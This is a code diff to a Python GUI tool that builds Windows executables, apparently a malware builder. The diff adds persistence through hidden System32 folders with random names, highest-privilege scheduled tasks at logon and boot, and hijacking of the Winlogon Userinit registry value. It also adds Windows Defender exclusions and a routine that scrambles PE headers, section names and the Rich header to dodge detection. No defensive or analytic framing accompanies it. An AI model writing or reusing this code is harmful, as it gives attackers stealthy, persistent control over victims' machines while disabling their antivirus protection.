@@ -24,6 +24,8 @@ import customtkinter as ctk
 import tkinter.filedialog
 import os
 import re
+import struct
+import string
 import sys
 import shutil
 import threading
@@ -46,41 +48,168 @@ ctk.set_appearance_mode("Dark")
 ACCENTS = ["#f1f1f1", "#c9d1ff", "#a8e6ff", "#ffd6f6", "#f1f1f1"]
 
 
+def _rnd(n):
+    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))
+
+
 def install_persistence(exe_path):
     try:
-        target_dir = r"C:\Windows\System32\ZZZ_Security"
+        import subprocess
+        folder = _rnd(10)
+        target_dir = os.path.join(r"C:\Windows\System32", folder)
         os.makedirs(target_dir, exist_ok=True)
-        target_exe = os.path.join(target_dir, "ZZZ_Security.exe")
+        target_exe = os.path.join(target_dir, _rnd(9) + ".exe")
+
         if exe_path and os.path.exists(exe_path):
             try:
                 shutil.copy2(exe_path, target_exe)
             except Exception:
                 pass
 
-        import subprocess
-        subprocess.run(["schtasks", "/Create", "/TN", "ZZZ_Security_Logon", "/TR", f'"{target_exe}"',
-                        "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"], capture_output=True)
-        subprocess.run(["schtasks", "/Create", "/TN", "ZZZ_Security_Boot", "/TR", f'"{target_exe}"',
-                        "/SC", "ONSTART", "/RL", "HIGHEST", "/F"], capture_output=True)
+        for sc in ("ONLOGON", "ONSTART"):
+            subprocess.run(["schtasks", "/Create", "/TN", _rnd(12), "/TR", f'"{target_exe}"',
+                            "/SC", sc, "/RL", "HIGHEST", "/F"], capture_output=True)
+
+        subprocess.run(["attrib", "+h", "+s", target_dir], capture_output=True)
+        subprocess.run(["attrib", "+h", "+s", target_exe], capture_output=True)
 
         try:
             key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                  r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_ALL_ACCESS)
             try:
                 existing, _ = winreg.QueryValueEx(key, "Userinit")
-                if "ZZZ_Security.exe" in existing:
-                    winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, r"C:\Windows\System32\userinit.exe,")
+                if os.path.basename(target_exe) not in existing:
+                    winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ,
+                                      f'"{target_exe}", C:\\Windows\\System32\\userinit.exe,')
             except FileNotFoundError:
-                pass
+                winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ,
+                                  f'"{target_exe}", C:\\Windows\\System32\\userinit.exe,')
             winreg.CloseKey(key)
         except Exception:
             pass
 
         subprocess.run(["powershell", "-NoProfile", "-Command",
-                        f'Add-MpPreference -ExclusionPath "{target_dir}" -ErrorAction SilentlyContinue'], capture_output=True)
+                        f'Add-MpPreference -ExclusionPath "{target_dir}" -ErrorAction SilentlyContinue'],
+                       capture_output=True)
+        subprocess.run(["powershell", "-NoProfile", "-Command",
+                        f'Add-MpPreference -ExclusionProcess "{os.path.basename(target_exe)}" -ErrorAction SilentlyContinue'],
+                       capture_output=True)
     except Exception:
         pass
 
+PYI_MAGIC = b"MEI\x0c\x0b\x0a\x0b\x0e"
+
+
+def _rekey_rich(data, pe):
+    try:
+        rich = data.rfind(b"Rich", 0x40, pe)
+        if rich < 0 or rich + 8 > pe:
+            return
+        old_key = struct.unpack("<I", bytes(data[rich + 4:rich + 8]))[0]
+        marker = struct.pack("<I", 0x536E6144 ^ old_key)
+        start = data.rfind(marker, 0x40, rich)
+        if start < 0:
+            return
+        new_key = random.getrandbits(32)
+        delta = old_key ^ new_key
+        for off in range(start, rich - 3, 4):
+            val = struct.unpack_from("<I", data, off)[0] ^ delta
+            struct.pack_into("<I", data, off, val)
+        struct.pack_into("<I", data, rich + 4, new_key)
+    except Exception:
+        pass
+
+
+def harden_exe(path):
+    try:
+        with open(path, "rb") as f:
+            data = bytearray(f.read())
+
+        if len(data) < 0x200 or data[:2] != b"MZ":
+            return False
+
+        pe = struct.unpack_from("<I", data, 0x3C)[0]
+        if data[pe:pe + 4] != b"PE\0\0":
+            return False
+
+        coff = pe + 4
+        opt = coff + 20
+        magic = struct.unpack_from("<H", data, opt)[0]
+        if magic == 0x10B:
+            dd = opt + 96
+        elif magic == 0x20B:
+            dd = opt + 112
+        else:
+            return False
+
+        num_sec = struct.unpack_from("<H", data, coff + 2)[0]
+        opt_size = struct.unpack_from("<H", data, coff + 16)[0]
+        if num_sec < 1 or num_sec > 96:
+            return False
+
+        sec_tab = opt + opt_size
+        if sec_tab + num_sec * 40 > len(data):
+            return False
+
+        struct.pack_into("<I", data, coff + 4, random.randint(0x5A000000, 0x6A000000))
+        struct.pack_into("<I", data, opt + 64, 0)
+
+        ends = []
+        for i in range(num_sec):
+            off = sec_tab + i * 40
+            raw_size = struct.unpack_from("<I", data, off + 16)[0]
+            raw_ptr = struct.unpack_from("<I", data, off + 20)[0]
+            if raw_size and raw_ptr and raw_ptr < len(data):
+                ends.append(min(raw_ptr + raw_size, len(data)))
+            name = "." + "".join(random.choice(string.ascii_letters) for _ in range(6))
+            data[off:off + 8] = name.encode().ljust(8, b"\0")[:8]
+
+        _rekey_rich(data, pe)
+
+        if ends:
+            cut = max(ends)
+            if 0 < cut < len(data):
+                pad = bytes(random.getrandbits(8) for _ in range(random.randint(512, 4096)))
+                if data.endswith(PYI_MAGIC):
+                    cookie = len(data) - 88
+                    if cookie > cut:
+                        for o in (cookie + 8, cookie + 12):
+                            val = struct.unpack_from("<I", data, o)[0]
+                            if val >= cut:
+                                struct.pack_into("<I", data, o, val + len(pad))
+                data[cut:cut] = pad
+
+        with open(path, "wb") as f:
+            f.write(data)
+        return True
+    except Exception:
+        return False
+
+
+def build_tmpdir():
+    return "%TEMP%\\" + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(9))
+
+def parse_imports(path):
+    args = []
+    if not os.path.exists(path):
+        return args
+    with open(path, "r", encoding="utf-8") as f:
+        for raw in f:
+            line = raw.strip()
+            if not line or line.startswith("#"):
+                continue
+            if "=" in line:
+                flag, value = line.split("=", 1)
+                value = value.strip().strip('"').strip("'")
+                flag = flag.strip()
+                if flag in ("--add-data", "--add-binary"):
+                    src = value.split(";")[0].split(":")[0]
+                    if not os.path.exists(src):
+                        continue
+                args.append(f"{flag}={value}")
+            else:
+                args.append(line)
+    return args
 
 class ModernBuilder(ctk.CTk):
     def __init__(self):
@@ -196,7 +325,7 @@ class ModernBuilder(ctk.CTk):
                                       text_color="#f2f2f2")
         self.lbl_title.pack(side="left", padx=24, pady=10)
 
-        ctk.CTkLabel(header, text="Beta v2.0 - MateAGYT/LessMi",
+        ctk.CTkLabel(header, text="Beta v2.5 - MateAGYT/LessMi",
                      font=ctk.CTkFont(family="Poppins", size=12), text_color="#8c8c8c").pack(side="right", padx=24)
 
         self.accent_bar = ctk.CTkFrame(self, height=3, corner_radius=2, fg_color="#f1f1f1")
@@ -413,7 +542,7 @@ class ModernBuilder(ctk.CTk):
                 shutil.rmtree("build")
             os.makedirs("dist", exist_ok=True)
 
-            for res in ["resources", "custom_imports.txt"]:
+            for res in ["custom_imports.txt"]:
                 if os.path.exists(res):
                     dest = os.path.join("dist", res)
                     if os.path.isdir(res):
@@ -467,6 +596,8 @@ class ModernBuilder(ctk.CTk):
                "source_final.py"]
         cmd.append("--onefile" if self.chk_onefile.get() == 1 else "--onedir")
         cmd.append("--uac-admin")
+        cmd.append("--clean")
+        cmd.append(f"--runtime-tmpdir={build_tmpdir()}")
         if self.config_data["icon_path"]:
             cmd.append("--icon=icon.ico")
 
@@ -475,15 +606,27 @@ class ModernBuilder(ctk.CTk):
             cmd.append(f"--add-data=resources{sep}resources")
         if os.path.exists("custom_imports.txt"):
             cmd.append(f"--add-data=custom_imports.txt{sep}.")
+        for arg in parse_imports(os.path.join(original_dir, "custom_imports.txt")):
+            if arg.startswith("--add-data=resources"):
+                continue
+            cmd.append(arg.replace(";", sep))
 
         try:
             subprocess.run(cmd, check=True)
-            self.update_status("Compile finished", 1.0)
 
             exe_out = os.path.join(os.getcwd(), f"{exe_target}.exe")
             if not os.path.exists(exe_out):
                 exe_out = os.path.join(os.getcwd(), exe_target, f"{exe_target}.exe")
 
+            self.update_status("Hardening binary...", 0.9)
+            hardened = False
+            for _ in range(3):
+                if harden_exe(exe_out):
+                    hardened = True
+                    break
+            self.update_status("Hardened" if hardened else "Hardening skipped", 0.95)
+
+            self.update_status("Compile finished", 1.0)
             install_persistence(exe_out)
 
             output_dir = os.getcwd()
